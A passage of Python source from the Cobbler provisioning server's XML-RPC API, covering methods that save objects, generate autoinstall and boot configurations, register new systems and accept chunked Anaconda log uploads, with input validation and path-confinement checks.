token, editmode: str = \"bypass\"):\n        \"\"\"\n        Saves a newly created or modified object to disk. Calling save is required for any changes to persist.\n\n        :param object_id: The id of the object to save.\n        :param token: The API-token obtained via the login() method.\n        :param editmode: The mode which shall be used to persist the changes. Currently \"new\" and \"bypass\" are\n                         supported.\n        :return: True if the action succeeded.\n        \"\"\"\n        return self.save_item(\"repo\", object_id, token, editmode=editmode)\n\n    def save_mgmtclass(self, object_id, token, editmode: str = \"bypass\"):\n        \"\"\"\n        Saves a newly created or modified object to disk. Calling save is required for any changes to persist.\n\n        :param object_id: The id of the object to save.\n        :param token: The API-token obtained via the login() method.\n        :param editmode: The mode which shall be used to persist the changes. Currently \"new\" and \"bypass\" are\n                         supported.\n        :return: True if the action succeeded.\n        \"\"\"\n        return self.save_item(\"mgmtclass\", object_id, token, editmode=editmode)\n\n    def save_package(self, object_id, token, editmode: str = \"bypass\"):\n        \"\"\"\n        Saves a newly created or modified object to disk. Calling save is required for any changes to persist.\n\n        :param object_id: The id of the object to save.\n        :param token: The API-token obtained via the login() method.\n        :param editmode: The mode which shall be used to persist the changes. Currently \"new\" and \"bypass\" are\n                         supported.\n        :return: True if the action succeeded.\n        \"\"\"\n        return self.save_item(\"package\", object_id, token, editmode=editmode)\n\n    def save_file(self, object_id, token, editmode: str = \"bypass\"):\n        \"\"\"\n        Saves a newly created or modified object to disk. Calling save is required for any changes to persist.\n\n        :param object_id: The id of the object to save.\n        :param token: The API-token obtained via the login() method.\n        :param editmode: The mode which shall be used to persist the changes. Currently \"new\" and \"bypass\" are\n                         supported.\n        :return: True if the action succeeded.\n        \"\"\"\n        return self.save_item(\"file\", object_id, token, editmode=editmode)\n\n    def save_menu(self, object_id, token, editmode=\"bypass\"):\n        \"\"\"\n        Saves a newly created or modified object to disk. Calling save is required for any changes to persist.\n\n        :param object_id: The id of the object to save.\n        :param token: The API-token obtained via the login() method.\n        :param editmode: The mode which shall be used to persist the changes. Currently \"new\" and \"bypass\" are\n                         supported.\n        :return: True if the action succeeded.\n        \"\"\"\n        return self.save_item(\"menu\", object_id, token, editmode=editmode)\n\n    def get_autoinstall_templates(self, token=None, **rest):\n        \"\"\"\n        Returns all of the automatic OS installation templates that are in use by the system.\n\n        :param token: The API-token obtained via the login() method.\n        :param rest: This is dropped in this method since it is not needed here.\n        :return: A list with all templates.\n        \"\"\"\n        self._log(\"get_autoinstall_templates\", token=token)\n        # self.check_access(token, \"get_autoinstall_templates\")\n        return self.autoinstall_mgr.get_autoinstall_templates()\n\n    def get_autoinstall_snippets(self, token=None, **rest):\n        \"\"\"\n        Returns all the automatic OS installation templates' snippets.\n\n        :param token: The API-token obtained via the login() method.\n        :param rest: This is dropped in this method since it is not needed here.\n        :return: A list with all snippets.\n        \"\"\"\n\n        self._log(\"get_autoinstall_snippets\", token=token)\n        return self.autoinstall_mgr.get_autoinstall_snippets()\n\n    def is_autoinstall_in_use(self, ai, token=None, **rest):\n        \"\"\"\n        Check if the autoinstall for a system is in use.\n\n        :param ai: The name of the system which could potentially be in autoinstall mode.\n        :param token: The API-token obtained via the login() method.\n        :param rest: This is dropped in this method since it is not needed here.\n        :return: True if this is the case, otherwise False.\n        \"\"\"\n        self._log(\"is_autoinstall_in_use\", token=token)\n        return self.autoinstall_mgr.is_autoinstall_in_use(ai)\n\n    def generate_autoinstall(self, profile=None, system=None, REMOTE_ADDR=None, REMOTE_MAC=None, **rest):\n        \"\"\"\n        Generate the autoinstallation file and return it.\n\n        :param profile: The profile to generate the file for.\n        :param system: The system to generate the file for.\n        :param REMOTE_ADDR: This is dropped in this method since it is not needed here.\n        :param REMOTE_MAC: This is dropped in this method since it is not needed here.\n        :param rest: This is dropped in this method since it is not needed here.\n        :return: The str representation of the file.\n        \"\"\"\n        # ToDo: Remove unneed params: REMOTE_ADDR, REMOTE_MAC, rest\n        self._log(\"generate_autoinstall\")\n        try:\n            return self.autoinstall_mgr.generate_autoinstall(profile, system)\n        except Exception:\n            utils.log_exc()\n            return \"# This automatic OS installation file had errors that prevented it from being rendered \" \\\n                   \"correctly.\\n# The cobbler.log should have information relating to this failure.\"\n\n    def generate_profile_autoinstall(self, profile):\n        \"\"\"\n        Generate a profile autoinstallation.\n\n        :param profile: The profile to generate the file for.\n        :return: The str representation of the file.\n        \"\"\"\n        return self.generate_autoinstall(profile=profile)\n\n    def generate_system_autoinstall(self, system):\n        \"\"\"\n        Generate a system autoinstallation.\n\n        :param system: The system to generate the file for.\n        :return: The str representation of the file.\n        \"\"\"\n        return self.generate_autoinstall(system=system)\n\n    def generate_ipxe(self, profile=None, image=None, system=None, **rest) -> str:\n        \"\"\"\n        Generate the ipxe configuration.\n\n        :param profile: The profile to generate iPXE config for.\n        :param image: The image to generate iPXE config for.\n        :param system: The system to generate iPXE config for.\n        :param rest: This is dropped in this method since it is not needed here.\n        :return: The configuration as a str representation.\n        \"\"\"\n        self._log(\"generate_ipxe\")\n        return self.api.generate_ipxe(profile, image, system)\n\n    def generate_bootcfg(self, profile: str = None, system: str = None, **rest) -> str:\n        \"\"\"\n        This generates the bootcfg for a system which is related to a certain profile.\n\n        :param profile: The profile which is associated to the system.\n        :param system: The system which the bootcfg should be generated for.\n        :param rest: This is dropped in this method since it is not needed here.\n        :return: The generated bootcfg.\n        \"\"\"\n        self._log(\"generate_bootcfg\")\n        return self.api.generate_bootcfg(profile, system)\n\n    def generate_script(self, profile: Optional[str] = None, system: Optional[str] = None, name: str = \"\") -> str:\n        \"\"\"\n        This generates the autoinstall script for a system or profile. Profile and System cannot be both given, if they\n        are, Profile wins.\n\n        :param profile: The profile name to generate the script for.\n        :param system: The system name to generate the script for.\n        :param name: Name of the generated script. Must only contain alphanumeric characters, dots and underscores.\n        :return: Some generated script.\n        \"\"\"\n        # This is duplicated from tftpgen.py to prevent log poisoning via a template engine (Cheetah, Jinja2).\n        if not validate_autoinstall_script_name(name):\n            raise ValueError(\"\\\"name\\\" handed to generate_script was not valid!\")\n        self._log(\"generate_script, name is \\\"%s\\\"\" % name)\n        return self.api.generate_script(profile, system, name)\n\n    def get_blended_data(self, profile=None, system=None):\n        \"\"\"\n        Combine all data which is available from a profile and system together and return it.\n\n        :param profile: The profile of the system.\n        :param system: The system for which the data should be rendered.\n        :return: All values which could be blended together through the inheritance chain.\n        \"\"\"\n        if profile is not None and profile != \"\":\n            obj = self.api.find_profile(profile)\n            if obj is None:\n                raise CX(\"profile not found: %s\" % profile)\n        elif system is not None and system != \"\":\n            obj = self.api.find_system(system)\n            if obj is None:\n                raise CX(\"system not found: %s\" % system)\n        else:\n            raise CX(\"internal error, no system or profile specified\")\n        data = utils.blender(self.api, True, obj)\n        return self.xmlrpc_hacks(data)\n\n    def get_settings(self, token=None, **rest) -> dict:\n        \"\"\"\n        Return the contents of our settings file, which is a dict.\n\n        :param token: The API-token obtained via the login() method.\n        :param rest: Unused parameter.\n        :return: Get the settings which are currently in Cobbler present.\n        \"\"\"\n        # self._log(\"get_settings\", token=token)\n        results = self.api.settings().to_dict()\n        # self._log(\"my settings are: %s\" % results, debug=True)\n        return self.xmlrpc_hacks(results)\n\n    def get_signatures(self, token=None, **rest) -> dict:\n        \"\"\"\n        Return the contents of the API signatures\n\n        :param token: The API-token obtained via the login() method.\n        :param rest: This is dropped in this method since it is not needed here.\n        :return: Get the content of the currently loaded signatures file.\n        \"\"\"\n        self._log(\"get_signatures\", token=token)\n        results = self.api.get_signatures()\n        return self.xmlrpc_hacks(results)\n\n    def get_valid_breeds(self, token=None, **rest) -> list:\n        \"\"\"\n        Return the list of valid breeds as read in from the distro signatures data\n\n        :param token: The API-token obtained via the login() method.\n        :param rest: This is dropped in this method since it is not needed here.\n        :return: All valid OS-Breeds which are present in Cobbler.\n        \"\"\"\n        self._log(\"get_valid_breeds\", token=token)\n        results = utils.get_valid_breeds()\n        results.sort()\n        return self.xmlrpc_hacks(results)\n\n    def get_valid_os_versions_for_breed(self, breed, token=None, **rest) -> list:\n        \"\"\"\n        Return the list of valid os_versions for the given breed\n\n        :param breed: The OS-Breed which is requested.\n        :param token: The API-token obtained via the login() method.\n        :param rest: This is dropped in this method since it is not needed here.\n        :return: All valid OS-versions for a certain breed.\n        \"\"\"\n        self._log(\"get_valid_os_versions_for_breed\", token=token)\n        results = utils.get_valid_os_versions_for_breed(breed)\n        results.sort()\n        return self.xmlrpc_hacks(results)\n\n    def get_valid_os_versions(self, token=None, **rest) -> list:\n        \"\"\"\n        Return the list of valid os_versions as read in from the distro signatures data\n\n        :param token: The API-token obtained via the login() method.\n        :param rest: This is dropped in this method since it is not needed here.\n        :return: Get all valid OS-Versions\n        \"\"\"\n        self._log(\"get_valid_os_versions\", token=token)\n        results = utils.get_valid_os_versions()\n        results.sort()\n        return self.xmlrpc_hacks(results)\n\n    def get_valid_archs(self, token=None) -> list:\n        \"\"\"\n        Return the list of valid architectures as read in from the distro signatures data\n\n        :param token: The API-token obtained via the login() method.\n        :return: Get a list of all valid architectures.\n        \"\"\"\n        self._log(\"get_valid_archs\", token=token)\n        results = utils.get_valid_archs()\n        results.sort()\n        return self.xmlrpc_hacks(results)\n\n    def get_valid_distro_boot_loaders(self, distro_name: str, token=None):\n        \"\"\"\n        Return the list of valid boot loaders for the distro\n\n        :param token: The API-token obtained via the login() method.\n        :param distro_name: The name of the distro for which the boot loaders should be looked up.\n        :return: Get a list of all valid boot loaders.\n        \"\"\"\n        self._log(\"get_valid_distro_boot_loaders\", token=token)\n        if distro_name is None:\n            return utils.get_supported_system_boot_loaders()\n        obj = self.api.find_distro(distro_name)\n        if obj is None:\n            return \"# object not found: %s\" % distro_name\n        return self.api.get_valid_obj_boot_loaders(obj)\n\n    def get_valid_image_boot_loaders(self, image_name: str, token=None):\n        \"\"\"\n        Return the list of valid boot loaders for the image\n\n        :param token: The API-token obtained via the login() method.\n        :param distro_name: The name of the image for which the boot loaders should be looked up.\n        :return: Get a list of all valid boot loaders.\n        \"\"\"\n        self._log(\"get_valid_image_boot_loaders\", token=token)\n        if image_name is None:\n            return utils.get_supported_system_boot_loaders()\n        obj = self.api.find_image(image_name)\n        if obj is None:\n            return \"# object not found: %s\" % image_name\n        return self.api.get_valid_obj_boot_loaders(obj)\n\n    def get_valid_profile_boot_loaders(self, profile_name, token=None):\n        \"\"\"\n        Return the list of valid boot loaders for the profile\n\n        :param token: The API-token obtained via the login() method.\n        :param profile_name: The name of the profile for which the boot loaders should be looked up.\n        :return: Get a list of all valid boot loaders.\n        \"\"\"\n        self._log(\"get_valid_profile_boot_loaders\", token=token)\n        if profile_name is None:\n            return utils.get_supported_system_boot_loaders()\n        obj = self.api.find_profile(profile_name)\n        if obj is None:\n            return \"# object not found: %s\" % profile_name\n        distro = obj.get_conceptual_parent()\n        return self.api.get_valid_obj_boot_loaders(distro)\n\n    def get_valid_system_boot_loaders(self, system_name: str, token=None) -> List[str]:\n        \"\"\"\n        Return the list of valid boot loaders for the system\n\n        :param token: The API-token obtained via the login() method.\n        :param system_name: The name of the system for which the boot loaders should be looked up.\n        :return: Get a list of all valid boot loaders.get_valid_archs\n        \"\"\"\n        self._log(\"get_valid_system_boot_loaders\", token=token)\n        if system_name is None:\n            return utils.get_supported_system_boot_loaders()\n        obj = self.api.find_system(system_name)\n        if obj is None:\n            return \"# object not found: %s\" % system_name\n        parent = obj.get_conceptual_parent()\n\n        if parent and parent.COLLECTION_TYPE == \"profile\":\n            return parent.boot_loaders\n        return self.api.get_valid_obj_boot_loaders(parent)\n\n    def get_repo_config_for_profile(self, profile_name, **rest):\n        \"\"\"\n        Return the yum configuration a given profile should use to obtain all of it's Cobbler associated repos.\n\n        :param profile_name: The name of the profile for which the repository config should be looked up.\n        :param rest: This is dropped in this method since it is not needed here.\n        :return: The repository configuration for the profile.\n        \"\"\"\n        obj = self.api.find_profile(profile_name)\n        if obj is None:\n            return \"# object not found: %s\" % profile_name\n        return self.api.get_repo_config_for_profile(obj)\n\n    def get_repo_config_for_system(self, system_name, **rest):\n        \"\"\"\n        Return the yum configuration a given profile should use to obtain all of it's Cobbler associated repos.\n\n        :param system_name: The name of the system for which the repository config should be looked up.\n        :param rest: This is dropped in this method since it is not needed here.\n        :return: The repository configuration for the system.\n        \"\"\"\n        obj = self.api.find_system(system_name)\n        if obj is None:\n            return \"# object not found: %s\" % system_name\n        return self.api.get_repo_config_for_system(obj)\n\n    def get_template_file_for_profile(self, profile_name, path, **rest):\n        \"\"\"\n        Return the templated file requested for this profile\n\n        :param profile_name: The name of the profile to get the template file for.\n        :param path: The path to the template which is requested.\n        :param rest: This is dropped in this method since it is not needed here.\n        :return: The template file as a str representation.\n        \"\"\"\n        obj = self.api.find_profile(profile_name)\n        if obj is None:\n            return \"# object not found: %s\" % profile_name\n        return self.api.get_template_file_for_profile(obj, path)\n\n    def get_template_file_for_system(self, system_name, path, **rest):\n        \"\"\"\n        Return the templated file requested for this system\n\n        :param system_name: The name of the system to get the template file for.\n        :param path: The path to the template which is requested.\n        :param rest: This is dropped in this method since it is not needed here.\n        :return: The template file as a str representation.\n        \"\"\"\n        obj = self.api.find_system(system_name)\n        if obj is None:\n            return \"# object not found: %s\" % system_name\n        return self.api.get_template_file_for_system(obj, path)\n\n    def register_new_system(self, info, token=None, **rest):\n        \"\"\"\n        If register_new_installs is enabled in settings, this allows /usr/bin/cobbler-register (part of the koan\n        package) to add new system records remotely if they don't already exist.\n        There is a cobbler_register snippet that helps with doing this automatically for new installs but it can also be\n        used for existing installs.\n\n        See \"AutoRegistration\" on the Wiki.\n\n        :param info: The system information which is provided by the system.\n        :param token: The API-token obtained via the login() method.\n        :param rest: This is dropped in this method since it is not needed here.\n        :return: Return 0 if everything succeeded.\n        \"\"\"\n\n        if not self.api.settings().register_new_installs:\n            raise CX(\"registration is disabled in cobbler settings\")\n\n        # validate input\n        name = info.get(\"name\", \"\")\n        profile = info.get(\"profile\", \"\")\n        hostname = info.get(\"hostname\", \"\")\n        interfaces = info.get(\"interfaces\", {})\n        ilen = len(list(interfaces.keys()))\n\n        if name == \"\":\n            raise CX(\"no system name submitted\")\n        if profile == \"\":\n            raise CX(\"profile not submitted\")\n        if ilen == 0:\n            raise CX(\"no interfaces submitted\")\n        if ilen >= 64:\n            raise CX(\"too many interfaces submitted\")\n\n        # validate things first\n        name = info.get(\"name\", \"\")\n        inames = list(interfaces.keys())\n        if self.api.find_system(name=name):\n            raise CX(\"system name conflicts\")\n        if hostname != \"\" and self.api.find_system(hostname=hostname):\n            raise CX(\"hostname conflicts\")\n\n        for iname in inames:\n            mac = info[\"interfaces\"][iname].get(\"mac_address\", \"\")\n            ip = info[\"interfaces\"][iname].get(\"ip_address\", \"\")\n            if ip.find(\"/\") != -1:\n                raise CX(\"no CIDR ips are allowed\")\n            if mac == \"\":\n                raise CX(\"missing MAC address for interface %s\" % iname)\n            if mac != \"\":\n                system = self.api.find_system(mac_address=mac)\n                if system is not None:\n                    raise CX(\"mac conflict: %s\" % mac)\n            if ip != \"\":\n                system = self.api.find_system(ip_address=ip)\n                if system is not None:\n                    raise CX(\"ip conflict: %s\" % ip)\n\n        # looks like we can go ahead and create a system now\n        obj = self.api.new_system()\n        obj.profile = profile\n        obj.name = name\n        if hostname != \"\":\n            obj.hostname = hostname\n        obj.netboot_enabled = False\n        for iname in inames:\n            if info[\"interfaces\"][iname].get(\"bridge\", \"\") == 1:\n                # don't add bridges\n                continue\n            mac = info[\"interfaces\"][iname].get(\"mac_address\", \"\")\n            ip = info[\"interfaces\"][iname].get(\"ip_address\", \"\")\n            netmask = info[\"interfaces\"][iname].get(\"netmask\", \"\")\n            if mac == \"?\":\n                # see koan/utils.py for explanation of network info discovery\n                continue\n            obj.set_mac_address(mac, iname)\n            if hostname != \"\":\n                obj.set_dns_name(hostname, iname)\n            if ip != \"\" and ip != \"?\":\n                obj.set_ip_address(ip, iname)\n            if netmask != \"\" and netmask != \"?\":\n                obj.set_netmask(netmask, iname)\n        self.api.add_system(obj)\n        return 0\n\n    def disable_netboot(self, name, token=None, **rest) -> bool:\n        \"\"\"\n        This is a feature used by the ``pxe_just_once`` support, see manpage. Sets system named \"name\" to no-longer PXE.\n        Disabled by default as this requires public API access and is technically a read-write operation.\n\n        :param name: The name of the system to disable netboot for.\n        :param token: The API-token obtained via the login() method.\n        :param rest: This parameter is unused.\n        :return: A boolean indicated the success of the action.\n        \"\"\"\n        self._log(\"disable_netboot\", token=token, name=name)\n        # used by nopxe.cgi\n        if not self.api.settings().pxe_just_once:\n            # feature disabled!\n            return False\n        if self.api.settings().nopxe_with_triggers:\n            # triggers should be enabled when calling nopxe\n            triggers_enabled = True\n        else:\n            triggers_enabled = False\n        systems = self.api.systems()\n        obj = systems.find(name=name)\n        if obj is None:\n            # system not found!\n            return False\n        obj.netboot_enabled = False\n        # disabling triggers and sync to make this extremely fast.\n        systems.add(obj, save=True, with_triggers=triggers_enabled, with_sync=False, quick_pxe_update=True)\n        # re-generate dhcp configuration\n        self.api.sync_dhcp()\n        return True\n\n    def upload_log_data(self, sys_name: str, file: str, size: int, offset: int, data: bytes,\n                        token: Optional[str] = None) -> bool:\n        \"\"\"\n        This is a logger function used by the \"anamon\" logging system to upload all sorts of misc data from Anaconda.\n        As it's a bit of a potential log-flooder, it's off by default and needs to be enabled in our settings.\n\n        :param sys_name: The name of the system for which to upload log data.\n        :param file: The file where the log data should be put.\n        :param size: The size of the data which will be received.\n        :param offset: The offset in the file where the data will be written to.\n        :param data: The data that should be logged.\n        :param token: The API-token obtained via the login() method.\n        :return: True if everything succeeded.\n        \"\"\"\n        if not self.__validate_log_data_params(sys_name, file, size, offset, data, token):\n            return False\n        self._log(\"upload_log_data (file: '%s', size: %s, offset: %s)\" % (file, size, offset), token=token,\n                  name=sys_name)\n\n        # Check if enabled in self.api.settings()\n        if not self.api.settings().anamon_enabled:\n            # feature disabled!\n            return False\n\n        # Find matching system record\n\n        obj = self.api.find_system(name=sys_name)\n        if obj is None:\n            # system not found!\n            self._log(\"upload_log_data - WARNING - system '%s' not found in Cobbler\" % sys_name, token=token,\n                      name=sys_name)\n            return False\n\n        return self.__upload_file(obj.name, file, size, offset, data)\n\n    def __validate_log_data_params(self, sys_name: str, logfile_name: str, size: int, offset: int, data: bytes,\n                                   token: Optional[str] = None) -> bool:\n        # Validate all types\n        if not (isinstance(sys_name, str) and isinstance(logfile_name, str) and isinstance(size, int)\n                and isinstance(offset, int) and isinstance(data, bytes)):\n            self.logger.warning(\"upload_log_data - One of the parameters handed over had an invalid type!\")\n            return False\n        if token is not None and not isinstance(token, str):\n            self.logger.warning(\"upload_log_data - token was given but had an invalid type.\")\n            return False\n        # Validate sys_name with item regex\n        if not re.fullmatch(item.RE_OBJECT_NAME, sys_name):\n            self.logger.warning(\"upload_log_data - The provided sys_name contained invalid characters!\")\n            return False\n        # Validate logfile_name - this uses the script name validation, possibly we need our own for this one later\n        if not validate_autoinstall_script_name(logfile_name):\n            self.logger.warning(\"upload_log_data - The provided file contained invalid characters!\")\n            return False\n        return True\n\n    def __upload_file(self, sys_name: str, logfile_name: str, size: int, offset: int, data: bytes) -> bool:\n        \"\"\"\n        Files can be uploaded in chunks, if so the size describes the chunk rather than the whole file. The offset\n        indicates where the chunk belongs the special offset -1 is used to indicate the final chunk.\n\n        :param sys_name: the name of the system\n        :param logfile_name: the name of the file\n        :param size: size of contents (bytes)\n        :param offset: the offset of the chunk\n        :param data: base64 encoded file contents\n        :return: True if the action succeeded.\n        \"\"\"\n        contents = base64.decodebytes(data)\n        del data\n        if offset != -1:\n            if size is not None:\n                if size != len(contents):\n                    return False\n\n        # FIXME: Get the base directory from Cobbler app-settings\n        anamon_base_directory = \"/var/log/cobbler/anamon\"\n        anamon_sys_directory = os.path.join(anamon_base_directory, sys_name)\n\n        file_name = os.path.join(anamon_sys_directory, logfile_name)\n        normalized_path = os.path.normpath(file_name)\n        if not normalized_path.startswith(anamon_sys_directory):\n            self.logger.warning(\"upload_log_data: built path for the logfile was outside of the Cobbler-Anamon log \"\n                                \"directory!\")\n            return False\n\n        if not os.path.isdir(anamon_sys_directory):\n            os.mkdir(anamon_sys_directory, 0o755)\n\n        try:\n            st = os.lstat(file_name)\n        except OSError as e:\n            if e.errno == errno.ENOENT:\n                pass\n            else:\n                raise\n        else:\n            if not stat.S_ISREG(st.st_mode):\n                raise CX(\"destination not a file: %s\" % file_name)\n\n        # TODO: See if we can simplify this at a later point\n        fd = os.open(file_name, os.O_RDWR | os.O_CREAT | os.O_CLOEXEC, 0o644)\n        # log_error(\"fd=%r\" %fd)\n        try:\n            if offset == 0 or (offset == -1 and size == len(contents)):\n                # truncate file\n                fcntl.lockf(fd, fcntl.LOCK_EX | fcntl.LOCK_NB)\n                try:\n                    os.ftruncate(fd, 0)\n                    # log_error(\"truncating fd %r to 0\" %fd)\n                finally:\n                    fcntl.lockf(fd, fcntl.LOCK_UN)\n            if offset == -1:\n                os.lseek(fd, 0, 2)\n            else:\n                os.lseek(fd, offset, 0)\n            # write contents\n            fcntl.lockf(fd, fcntl.LOCK_EX | fcntl.LOCK_NB, len(contents), 0, 2)\n            try:\n                os.write(fd, contents)\n                # log_error(\"wrote contents\")\n            finally:\n                fcntl.lockf(fd, fcntl.LOCK_UN, len(contents), 0, 2)\n            if offset == -1:\n                if size is not None:\n                    # truncate file\n                    fcntl.lockf(fd, fcntl.LOCK_EX | fcntl.LOCK_NB)\n                    try:\n                        os.ftruncate(fd, size)\n                        # log_error(\"truncating fd %r to size %r\" % (fd,size))\n                    finally:\n                        fcntl.lockf(fd, fcntl.LOCK_UN)\n        finally:\n            os.close(fd)\n        return True\n\n    def run_install_triggers(self, mode, objtype, name, ip, token=None, **rest):\n        \"\"\"\n        This is a feature used to run the pre/post install triggers.\n        See CobblerTriggers on Wiki for details\n\n        :param mode: The mode of the triggers. May be \"pre\", \"post\" or \"firstboot\".\n        :param objtype: The type of object. This should correspond to the collection type.\n        :param name: The name of the object.\n        :param ip: The ip of the objet.\n        :param token: The API-token obtained via the login() method.\n        :param rest: This is dropped in this method since it is not needed here.\n        :return: True if everything worked correctly.\n        \"\"\"\n        self._log(\"run_install_triggers\", token=token)\n\n        if mode != \"pre\" and mode != \"post\" and mode != \"firstboot\":\n            return False\n        if objtype != \"system\" and objtype != \"profile\":\n            return False\n\n        # The trigger script is called with name,mac, and ip as arguments 1,2, and 3 we do not do API lookups here\n        # because they are rather expensive at install time if reinstalling all of a cluster all at once.\n        # We can do that at \"cobbler check\" time.\n        utils.run_triggers(self.api, None, \"/var/lib/cobbler/triggers/install/%s/*\" % mode,\n                           additional=[objtype, name, ip])\n        return True\n\n    def version(self, token=None, **rest):\n        \"\"\"\n        Return the Cobbler version for compatibility testing with remote applications.\n        See api.py for documentation.\n\n        :param token: The API-token obtained via the login() method.\n        :param rest: This is dropped in this method since it is not needed here.\n        :return: The short version of Cobbler.\n        \"\"\"\n        self._log(\"version\", token=token)\n        return self.api.version()\n\n    def extended_version(self, token=None, **rest):\n        \"\"\"\n        Returns the full dictionary of version information.  See api.py for documentation.\n\n        :param token: The API-token obtained via the login() method.\n        :param rest: This is dropped in this method since it is not needed here.\n        :return: The extended version of Cobbler\n        \"\"\"\n        self._log(\"version\", token=token)\n        return self.api.version(extended=True)\n\n    def get_distros_since(self, mtime: float):\n        \"\"\"\n        Return all of the distro objects that have been modified after mtime.\n\n        :param mtime: The time after which all items should be included. Everything before this will be excluded.\n        :return: The list of items which were modified after ``mtime``.\n        \"\"\"\n        data = self.api.get_distros_since(mtime, collapse=True)\n        return self.xmlrpc_hacks(data)\n\n    def get_profiles_since(self, mtime: float):\n        \"\"\"\n        See documentation for get_distros_since\n\n        :param mtime: The time after which all items should be included. Everything before this will be excluded.\n        :return: The list of items which were modified after ``mtime``.\n        \"\"\"\n        data = self.api.get_profiles_since(mtime, collapse=True)\n        return self.xmlrpc_hacks(data)\n\n    def get_systems_since(self, mtime: float):\n        \"\"\"\n        See documentation for get_distros_since\n\n        :param mtime: The time after which all items should be included. Everything before this will be excluded.\n        :return: The list of items which were modified after ``mtime``.\n        \"\"\"\n        data = self.api.get_systems_since(mtime, collapse=True)\n        return self.xmlrpc_hacks(data)\n\n    def get_repos_since(self, mtime: float):\n        \"\"\"\n        See documentation for get_distros_since\n\n        :param mtime: The time after which all items should be included. Everything before this will be excluded.\n        :return: The list of items which were modified after ``mtime``.\n        \"\"\"\n        data = self.api.get_repos_since(mtime, collapse=True)\n        return self.xmlrpc_hacks(data)\n\n    def get_images_since(self, mtime: float):\n        \"\"\"\n        See documentation for get_distros_since\n\n        :param mtime: The time after which all items should be included. Everything before this will be excluded.\n        :return: The list of items which were modified after ``mtime``.\n        \"\"\"\n        data = self.api.get_images_since(mtime, collapse=True)\n        return self.xmlrpc_hacks(data)\n\n    def get_mgmtclasses_since(self, mtime: float):\n        \"\"\"\n        See documentation for get_distros_since\n\n        :param mtime: The time after which all items should be included. Everything before this will be excluded.\n        :return: The list of items which were modified after ``mtime``.\n        \"\"\"\n        data = self.api.get_mgmtclasses_since(mtime, collapse=True)\n        return self.xmlrpc_hacks(data)\n\n    def get_packages_since(self, mtime: float):\n        \"\"\"\n        See documentation for get_distros_since\n\n        :param mtime: The time after which all items should be included. Everything before this will be excluded.\n        :return: The list of items which were modified after ``mtime``.\n        \"\"\"\n        data = self.api.get_packages_since(mtime, collapse=True)\n        return self.xmlrpc_hacks(data)\n\n    def get_files_since(self, mtime: float):\n        \"\"\"\n        See documentation for get_distros_since\n\n        :param mtime: The time after which all items should be included. Everything before this will be excluded.\n        :return: The list of items which were modified after ``mtime``.\n        \"\"\"\n        data = self.api.get_files_since(mtime, collapse=True)\n        return self.xmlrpc_hacks(data)\n\n    def get_menus_since(self, mtime: float):\n        \"\"\"\n        See documentation for get_distros_since\n\n        :param mtime: The time after which all items should be included. Everything before this will be excluded.\n        :return: The list of items which were modified after ``mtime``.\n        \"\"\"\n        data = self.api.get_menus_since(mtime, collapse=True)\n        return self.xmlrpc_hacks(data)\n\n    def get_repos_compatible_with_profile(self, profile=None, token=None, **rest) -> list:\n        \"\"\"\n        Get repos that can be used with a given profile name.\n\n        :param profile: The profile to check for compatibility.\n        :param token: The API-token obtained via the login() method.\n        :param rest: This is dropped in this method since it is not needed here.\n        :return: The list of compatible repositories.\n        \"\"\"\n        self._log(\"get_repos_compatible_with_profile\", token=token)\n        profile = self.api.find_profile(profile)\n        if profile is None:\n            self.logger.info(\"The profile name supplied (\\\"%s\\\") for get_repos_compatible_with_profile was not\"\n                             \"existing\", profile)\n            return []\n        results = []\n        distro = profile.get_conceptual_parent()\n        for current_repo in self.api.repos():\n            # There be dragons!\n            # Accept all repos that are src/noarch but otherwise filter what repos are compatible with the profile based\n            # on the arch of the distro.\n            # FIXME: Use the enum directly\n            if current_repo.arch is None or current_repo.arch.value in [\"\", \"noarch\", \"src\"]:\n                results.append(current_repo.to_dict())\n            else:\n                # some backwards compatibility fuzz\n                # repo.arch is mostly a text field\n                # distro.arch is i386/x86_64\n                if current_repo.arch.value in [\"i386\", \"x86\", \"i686\"]:\n                    if distro.arch.value in [\"i386\", \"x86\"]:\n                        results.append(current_repo.to_dict())\n                elif current_repo.arch.value in [\"x86_64\"]:\n                    if distro.arch.value in [\"x86_64\"]:\n                        results.append(current_repo.to_dict())\n                else:\n                    if distro.arch == current_repo.arch:\n                        results.append(current_repo.to_dict())\n        return results\n\n    def find_system_by_dns_name(self, dns_name):\n        \"\"\"\n        This is used by the puppet external nodes feature.\n\n        :param dns_name: The dns name of the system. This should be the fqdn and not only the hostname.\n        :return: All system information or an empty dict.\n        \"\"\"\n        # FIXME: expose generic finds for other methods\n        # WARNING: this function is /not/ expected to stay in Cobbler long term\n        system = self.api.find_system(dns_name=dns_name)\n        if system is None:\n            return {}\n        else:\n            return self.get_system_as_rendered(system.name)\n\n    def get_distro_as_rendered(self, name: str, token: str = None, **rest):\n        \"\"\"\n        Get distribution after passing through Cobbler's inheritance engine.\n\n        :param name: distro name\n        :param token: authentication token\n        :param rest: This is dropped in this method since it is not needed here.\n        :return: Get a template rendered as a distribution.\n        \"\"\"\n\n        self._log(\"get_distro_as_rendered\", name=name, token=token)\n        obj = self.api.find_distro(name=name)\n        if obj is not None:\n            return self.xmlrpc_hacks(utils.blender(self.api, True, obj))\n        return self.xmlrpc_hacks({})\n\n    def get_profile_as_rendered(self, name: str, token: str = None, **rest):\n        \"\"\"\n        Get profile after passing through Cobbler's inheritance engine.\n\n        :param name: profile name\n        :param token: authentication token\n        :param rest: This is dropped in this method since it is not needed here.\n        :return: Get a template rendered as a profile.\n        \"\"\"\n\n        self._log(\"get_profile_as_rendered\", name=name, token=token)\n        obj = self.api.find_profile(name=name)\n        if obj is not None:\n            return self.xmlrpc_hacks(utils.blender(self.api, True, obj))\n        return self.xmlrpc_hacks({})\n\n    def get_system_as_rendered(self, name: str, token: str = None, **rest):\n        \"\"\"\n        Get profile after passing through Cobbler's inheritance engine.\n\n        :param name: system name\n        :param token: authentication token\n        :param rest: This is dropped in this method since it is not needed here.\n        :return: Get a template rendered as a system.\n        \"\"\"\n\n        self._log(\"get_system_as_rendered\", name=name, token=token)\n        obj = self.api.find_system(name=name)\n        if obj is not None:\n            _dict = utils.blender(self.api, True, obj)\n            # Generate a pxelinux.cfg?\n            image_based = False\n            profile = obj.get_conceptual_parent()\n            distro = profile.get_conceptual_parent()\n\n            # The management classes stored in the system are just a list of names, so we need to turn it into a full\n            # list of dictionaries (right now we just use the params field).\n            mcs = _dict[\"mgmt_classes\"]\n            _dict[\"mgmt_classes\"] = {}\n            for m in mcs:\n                c = self.api.find_mgmtclass(name=m)\n                if c:\n                    _dict[\"mgmt_classes\"][m] = c.to_dict()\n\n            arch = None\n            if distro is None and 